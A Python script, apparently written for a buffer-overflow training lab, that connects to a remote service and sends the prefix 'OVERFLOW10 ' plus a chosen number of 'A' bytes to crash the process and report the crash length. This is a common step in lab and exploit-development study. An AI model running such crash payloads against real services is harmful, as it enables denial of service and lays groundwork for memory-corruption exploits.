#!/usr/bin/env python3

import socket
import argparse
import itertools
import time
import subprocess
import sys
from typing import Optional

def main(ip: str, port: int, size: int) -> None:
	# Define prefix and buffer
	prefix = b"OVERFLOW10 "	# CHANGE
	buffer = b"A" * size
	timeout = 3
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			try:
				while True:
					response = s.recv(4096)
					print(f"{response.decode()}")
			except:
				pass

			# Send data to the server with increasing buffer sizes
			payload = b"".join(
				[
					prefix,
					buffer
				]
			)
			print(f"Fuzzing with {len(buffer)} bytes...")
			s.send(payload)

			# Print the response from the server
			response = s.recv(4096)
			print(f"Response: {response.decode()}")
			
	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		overflow_threshold = len(buffer)
		print(f"Application crashed at {overflow_threshold} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Manual Crash",
		description="""This is a Python script that attemps to crash a remote server's process by sending a fixed buffer size. 
	The script takes three arguments: an IP address, a port number, and a buffer size in bytes.
	The purpose of this script is to test the robustness of the target program. It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("size", type=int, help="Buffer size in bytes")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, args.size)